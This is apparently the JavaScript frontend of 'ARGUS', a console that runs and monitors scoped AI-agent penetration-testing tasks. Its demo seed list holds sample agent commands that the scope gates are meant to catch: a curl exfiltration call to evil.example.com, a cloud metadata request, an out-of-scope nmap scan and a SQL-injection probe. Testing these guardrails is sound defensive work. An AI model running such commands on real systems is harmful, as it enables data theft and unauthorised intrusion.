'use strict';

/* ARGUS 控制台前端：零依赖，直接消费 Go 后端的 /api/* */

const qs = new URLSearchParams(location.search);
const TOKEN = qs.get('token') || localStorage.getItem('argus_token') || '';
if (qs.get('token')) localStorage.setItem('argus_token', qs.get('token'));

const S = {
  tasks: [],
  id: 0,
  detail: null,
  tab: 'overview',
  timer: null,
  lastReport: '',
};

const $ = (id) => document.getElementById(id);
const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

function toast(msg, isErr) {
  const el = $('toast');
  el.textContent = msg;
  el.className = 'toast show' + (isErr ? ' err' : '');
  clearTimeout(el._t);
  el._t = setTimeout(() => { el.className = 'toast'; }, 3200);
}

async function api(path, opt) {
  opt = opt || {};
  opt.headers = Object.assign({}, opt.headers);
  if (TOKEN) opt.headers['Authorization'] = 'Bearer ' + TOKEN;
  if (opt.body && typeof opt.body !== 'string') {
    opt.body = JSON.stringify(opt.body);
    opt.headers['Content-Type'] = 'application/json';
  }
  const res = await fetch(path, opt);
  if (res.status === 401) {
    toast('需要 Bearer token：在地址后加 ?token=xxx', true);
    throw new Error('unauthorized');
  }
  return res;
}

async function apiJSON(path, opt) {
  const res = await api(path, opt);
  const txt = await res.text();
  let data = null;
  try { data = txt ? JSON.parse(txt) : null; } catch (e) { data = { raw: txt }; }
  if (!res.ok) throw new Error((data && data.error) || ('HTTP ' + res.status));
  return data;
}

/* ---------------- 任务列表 ---------------- */

async function loadTasks() {
  try {
    const d = await apiJSON('/api/tasks');
    S.tasks = d.tasks || [];
    renderTasks();
    $('taskCount').textContent = S.tasks.length;
    if (!S.id && S.tasks.length) selectTask(S.tasks[0].id);
    if (S.id && !S.tasks.some((t) => t.id === S.id)) selectTask(S.tasks[0] ? S.tasks[0].id : 0);
  } catch (e) { /* 轮询期静默 */ }
}

function renderTasks() {
  const box = $('taskList');
  if (!S.tasks.length) {
    box.innerHTML = '<div class="muted small" style="padding:10px 4px">暂无任务</div>';
    return;
  }
  box.innerHTML = S.tasks.map((t) => {
    const st = t.state || 'idle';
    return `<div class="task-item ${t.id === S.id ? 'active' : ''}" data-id="${t.id}">
      <div class="tname"><span class="st ${st}"></span>${esc(t.name || ('任务 #' + t.id))}</div>
      <div class="tmeta">#${t.id} · ${esc(st)} · ${t.workers || 3} worker</div>
    </div>`;
  }).join('');
  box.querySelectorAll('.task-item').forEach((el) => {
    el.onclick = () => selectTask(Number(el.dataset.id));
  });
}

/* ---------------- 详情 ---------------- */

async function selectTask(id) {
  S.id = id;
  if (!id) { $('detail').classList.add('hidden'); $('empty').classList.remove('hidden'); return; }
  renderTasks();
  $('empty').classList.add('hidden');
  $('detail').classList.remove('hidden');
  await refreshAll();
}

async function refreshAll() {
  if (!S.id) return;
  try {
    const d = await apiJSON('/api/tasks/' + S.id);
    S.detail = d;
    renderHeader(d);
    const [intents, findings, viol, evs, bud] = await Promise.all([
      apiJSON('/api/tasks/' + S.id + '/intents').catch(() => ({ intents: [] })),
      apiJSON('/api/tasks/' + S.id + '/findings').catch(() => ({ findings: [] })),
      apiJSON('/api/tasks/' + S.id + '/violations').catch(() => ({ violations: [], by_layer: {} })),
      apiJSON('/api/tasks/' + S.id + '/evidence').catch(() => ({ evidence: [] })),
      apiJSON('/api/budget').catch(() => ({ lines: [] })),
    ]);
    renderKPI(d, intents.intents || [], viol);
    renderScope(d.scope || []);
    renderBudget(bud.lines || []);
    renderOverview(intents.intents || [], evs.evidence || []);
    renderIntents(intents.intents || []);
    renderFindings(findings.findings || []);
    renderViolations(viol.violations || []);
    renderEvidence(evs.evidence || []);
    await loadReport();
  } catch (e) {
    if (String(e.message) !== 'unauthorized') toast('刷新失败: ' + e.message, true);
  }
}

function renderHeader(d) {
  const t = d.task || {};
  $('taskTitle').textContent = t.name || ('任务 #' + t.id);
  const st = t.state || 'idle';
  const pill = $('taskState');
  pill.textContent = d.running ? 'running' : st;
  pill.className = 'pill ' + (d.running ? 'running' : st);
  $('taskGoal').textContent = t.goal || '—';
  $('btnStart').disabled = !!d.running;
  $('btnStop').disabled = !d.running;
}

function renderKPI(d, intents, viol) {
  const done = intents.filter((i) => i.state === 'done').length;
  const blocked = intents.filter((i) => i.state === 'blocked' || i.state === 'exhausted').length;
  const running = intents.filter((i) => i.state === 'running').length;
  $('kIntents').textContent = intents.length;
  $('kIntentsSub').textContent = running ? (running + ' 运行中') : '全部收敛';
  $('kDone').textContent = done;
  $('kBlocked').textContent = blocked;
  const by = (viol && viol.by_layer) || {};
  const violTotal = Object.values(by).reduce((a, b) => a + b, 0);
  $('kViol').textContent = violTotal;
  $('kFind').textContent = d.findings || 0;
  $('kEv').textContent = d.evidence != null ? d.evidence : '—';
  const execN = by.exec || 0, netN = by.network || 0, intN = by.intent || 0;
  $('mIntent').style.width = Math.min(100, intN * 20) + '%';
  $('mExec').style.width = Math.min(100, execN * 20) + '%';
  $('mNet').style.width = Math.min(100, netN * 20) + '%';
}

function renderScope(rules) {
  const box = $('scopeList');
  if (!rules.length) { box.innerHTML = '<span class="muted small">（无范围：默认拒绝）</span>'; return; }
  box.innerHTML = rules.map((r) => `<span class="chip">${esc(r)}</span>`).join('');
}

function renderBudget(lines) {
  const box = $('budgetList');
  if (!lines.length) { box.innerHTML = '<div class="muted small">尚未记账</div>'; return; }
  box.innerHTML = lines.slice(0, 8).map((l) => {
    const i = l.lastIndexOf(' ');
    return `<div><span>${esc(l.slice(0, i))}</span><b>${esc(l.slice(i + 1))}</b></div>`;
  }).join('');
}

function renderOverview(intents, evs) {
  $('kEvSub').textContent = '链校验 ' + (evs.length ? '待验' : '—');
  const box = $('evTimeline');
  if (!evs.length) { box.innerHTML = '<div class="muted small">暂无证据（启动任务后产生）</div>'; return; }
  box.innerHTML = evs.slice(0, 12).map((r) => {
    let brief = '';
    try {
      const p = r.payload || {};
      brief = p.reason || p.cmd || (p.Tool ? (p.Tool + ' · exit ' + p.exit_code) : JSON.stringify(p).slice(0, 90));
      if (!brief) brief = JSON.stringify(p).slice(0, 90);
    } catch (e) { brief = ''; }
    return `<div class="tl-item ${esc(r.kind)}">
      <span class="tl-kind">${esc(r.kind)} · ${esc(r.id)}</span>
      <span class="tl-body">${esc(brief)}</span>
    </div>`;
  }).join('');
}

function renderIntents(intents) {
  const tb = $('tbIntents');
  if (!intents.length) { tb.innerHTML = '<tr><td colspan="5" class="muted">暂无意图</td></tr>'; return; }
  tb.innerHTML = intents.map((i) => `<tr>
    <td class="mono">#${i.id}</td>
    <td class="s-${esc(i.state)}">${esc(i.state)}</td>
    <td class="mono">${esc(i.summary)}</td>
    <td>${esc(i.action || '')}</td>
    <td class="mono">${esc((i.fp || '').slice(0, 12))}</td>
  </tr>`).join('');
}

function renderFindings(fs) {
  const box = $('findingsList');
  if (!fs.length) { box.innerHTML = '<div class="card muted small">暂无漏洞。演示任务会产出一条带证据的 SQL 注入结论。</div>'; return; }
  box.innerHTML = fs.map((f) => `<div class="finding">
    <div class="fhead">
      <span class="sev ${esc(f.severity || 'info')}">${esc(f.severity || 'info')}</span>
      <span class="ftitle">${esc(f.title)}</span>
      <span class="attack">${esc(f.technique)} · ${esc(f.tactic)}</span>
    </div>
    <div class="fmeta">
      <span>类别 <b>${esc(f.vuln_class)}</b></span>
      <span>资产 <b>${esc(f.target || '—')}</b></span>
      <span>证据 <b class="mono">${esc(f.evidence_id)}</b></span>
      <span>时间 <b>${esc((f.created_at || '').replace('T', ' ').slice(0, 19))}</b></span>
    </div>
  </div>`).join('');
}

function renderViolations(vs) {
  const tb = $('tbViol');
  if (!vs.length) { tb.innerHTML = '<tr><td colspan="5" class="muted">暂无越界尝试</td></tr>'; return; }
  tb.innerHTML = vs.slice().reverse().map((v) => `<tr>
    <td><span class="badge ${esc(v.layer)}">${esc(v.layer)}</span></td>
    <td class="mono">${esc(v.target)}</td>
    <td>${esc(v.reason)}</td>
    <td>${esc(v.tool || '')}</td>
    <td class="mono">${esc((v.ts || '').replace('T', ' ').slice(11, 19))}</td>
  </tr>`).join('');
}

function renderEvidence(es) {
  const tb = $('tbEv');
  if (!es.length) { tb.innerHTML = '<tr><td colspan="4" class="muted">暂无证据</td></tr>'; return; }
  tb.innerHTML = es.map((r) => `<tr>
    <td class="mono">${esc(r.id)}</td>
    <td>${esc(r.kind)}</td>
    <td class="mono">${esc((r.hash || '').slice(0, 16))}…</td>
    <td class="mono">${esc((r.ts || '').replace('T', ' ').slice(0, 19))}</td>
  </tr>`).join('');
}

/* ---------------- 报告 ---------------- */

async function loadReport() {
  if (!S.id) return;
  try {
    const res = await api('/api/tasks/' + S.id + '/report');
    const text = await res.text();
    S.lastReport = text;
    $('reportBox').textContent = text || '（空）';
  } catch (e) { $('reportBox').textContent = '报告加载失败: ' + e.message; }
}

/* ---------------- 操作 ---------------- */

async function startTask() {
  try {
    await apiJSON('/api/tasks/' + S.id + '/start', { method: 'POST' });
    toast('已启动，调度器开始派发');
    setTimeout(refreshAll, 400);
    loadTasks();
  } catch (e) { toast('启动失败: ' + e.message, true); }
}

async function stopTask() {
  try {
    await apiJSON('/api/tasks/' + S.id + '/stop', { method: 'POST' });
    toast('已请求停止（有序收尾）');
  } catch (e) { toast('停止失败: ' + e.message, true); }
}

const DEMO_SEEDS = [
  { action: 'Bash', summary: '{"command":"nmap -sV -p 80,443 lab.internal"}', asset_id: 1, param_key: 'scan' },
  { action: 'WebFetch', summary: '{"url":"http://api.lab.internal/v1/users?id=1"}', asset_id: 2, param_key: 'fetch:users' },
  { action: 'Bash', summary: '{"command":"curl http://evil.example.com/exfil?d=1"}', asset_id: 3, param_key: 'exfil' },
  { action: 'Bash', summary: '{"command":"nmap -Pn 8.8.8.8"}', asset_id: 4, param_key: 'scan:8.8.8.8' },
  { action: 'Bash', summary: '{"command":"curl http://169.254.169.254/latest/meta-data/"}', asset_id: 5, param_key: 'imds' },
  { action: 'Bash', summary: '{"command":"curl \'http://api.lab.internal/v1/users?id=1%27\'"}', asset_id: 2, param_key: 'sqli:users', vuln_class: 'SQL 注入', severity: 'high', target: 'api.lab.internal' },
];

async function createTask(payload) {
  const d = await apiJSON('/api/tasks', { method: 'POST', body: payload });
  toast('任务已创建 #' + d.task.id + '，范围 ' + (d.scope || []).length + ' 条');
  S.id = d.task.id;
  await loadTasks();
  await refreshAll();
  return d.task.id;
}

async function demoTask() {
  try {
    const id = await createTask({
      name: 'demo-lab-' + new Date().toISOString().slice(11, 19),
      goal: '验证三层闸门 / 预算 / 证据链（演示数据，不触碰真实目标）',
      scope: [
        { kind: 'domain_suffix', value: 'lab.internal' },
        { kind: 'cidr', value: '10.20.0.0/16' },
      ],
      workers: 3,
      minutes: 10,
      seed: DEMO_SEEDS,
    });
    S.id = id;
    await startTask();
  } catch (e) { toast('演示任务创建失败: ' + e.message, true); }
}

/* ---------------- 新建任务弹窗 ---------------- */

function openModal() { $('modal').classList.remove('hidden'); }
function closeModal() { $('modal').classList.add('hidden'); }

function parseScope(text) {
  const out = [];
  text.split('\n').map((s) => s.trim()).filter(Boolean).forEach((line) => {
    const i = line.indexOf(':');
    if (i < 0) return;
    out.push({ kind: line.slice(0, i).trim(), value: line.slice(i + 1).trim() });
  });
  return out;
}

function parseSeeds(text) {
  const out = [];
  text.split('\n').map((s) => s.trim()).filter(Boolean).forEach((line, idx) => {
    const parts = line.split('|');
    const action = (parts[0] || 'Bash').trim();
    const summary = (parts[1] || '').trim();
    const vuln = (parts[2] || '').trim();
    const item = { action: action, summary: summary, asset_id: idx + 1, param_key: 'k' + (idx + 1) };
    if (vuln) { item.vuln_class = vuln; item.severity = 'high'; }
    out.push(item);
  });
  return out;
}

async function submitCreate() {
  const name = $('fName').value.trim() || ('task-' + Date.now());
  const goal = $('fGoal').value.trim();
  const scope = parseScope($('fScope').value);
  const seed = parseSeeds($('fSeed').value);
  if (!goal) { toast('目标描述不能为空（目标歧义门禁）', true); return; }
  if (!scope.length) { toast('授权范围不能为空（默认拒绝）', true); return; }
  try {
    await createTask({ name: name, goal: goal, scope: scope, workers: 3, minutes: 30, seed: seed });
    closeModal();
    await startTask();
  } catch (e) { toast('创建失败: ' + e.message, true); }
}

/* ---------------- 启动 ---------------- */

function bind() {
  $('btnRefresh').onclick = () => { loadTasks(); refreshAll(); toast('已刷新'); };
  $('btnStart').onclick = startTask;
  $('btnStop').onclick = stopTask;
  $('btnDemo').onclick = demoTask;
  $('btnNew').onclick = openModal;
  $('btnCancel').onclick = closeModal;
  $('modalClose').onclick = closeModal;
  $('btnCreate').onclick = submitCreate;
  $('btnCopy').onclick = async () => {
    try { await navigator.clipboard.writeText(S.lastReport); toast('报告已复制'); }
    catch (e) { toast('复制失败，请手动选择', true); }
  };
  $('btnDownload').onclick = () => {
    const blob = new Blob([S.lastReport], { type: 'text/markdown' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'argus-report-' + S.id + '.md';
    a.click();
    URL.revokeObjectURL(a.href);
  };
  document.querySelectorAll('.tab').forEach((t) => {
    t.onclick = () => {
      S.tab = t.dataset.tab;
      document.querySelectorAll('.tab').forEach((x) => x.classList.toggle('active', x === t));
      document.querySelectorAll('.pane').forEach((p) => p.classList.toggle('active', p.id === 'pane-' + S.tab));
      if (S.tab === 'report') loadReport();
    };
  });
}

async function boot() {
  bind();
  try {
    const h = await apiJSON('/api/health');
    $('health').className = 'dot on';
    $('health').title = '在线 · 证据 ' + (h.evidence || 0) + ' 条';
  } catch (e) {
    $('health').className = 'dot off';
  }
  await loadTasks();
  S.timer = setInterval(async () => {
    if (!S.id) return;
    await loadTasks();
    if (S.detail && S.detail.running) await refreshAll();
  }, 2000);
}

document.addEventListener('DOMContentLoaded', boot);
